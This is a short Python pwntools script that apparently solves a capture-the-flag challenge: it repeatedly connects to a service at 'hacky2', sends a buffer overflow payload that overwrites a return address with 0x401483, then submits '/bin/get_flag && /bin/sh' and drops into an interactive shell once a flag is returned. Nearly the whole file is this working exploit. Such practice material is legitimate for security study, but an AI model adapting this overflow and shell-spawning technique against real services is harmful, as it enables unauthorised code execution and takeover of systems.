#!/usr/bin/python3

#NOTE: The actually relevant stuff (exploit string) is located in lines 49 to 52

#import libraries
import sys
import pwn
#get some pwn stuff into global namespace
from pwn import p64
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky2"
    port = 13708


#ACTUAL EXPLOIT IS LOCATED IN THIS SECTION:
prompt = b"\x1b[36mPlease provide your un-canonicalized file path:\x1b[33m\n"

while True:
    proc=pwn.remote(host,port,fam="ipv4")
    proc.sendafter(prompt, 35*p64(0x00) + p64(0x401483) + 2*p64(0x00) + b"\x50\x5e")
    proc.sendafter(prompt, b"/bin/get_flag && /bin/sh\x00")

    try:
        res = proc.readline()
        if b'flag' in res:
            print(res.decode())
            print("Here's your shell:")
            proc.interactive()
            break
    except EOFError:
        pass

    proc.close()

#ACTUAL EXPLOIT SECTION ENDS HERE

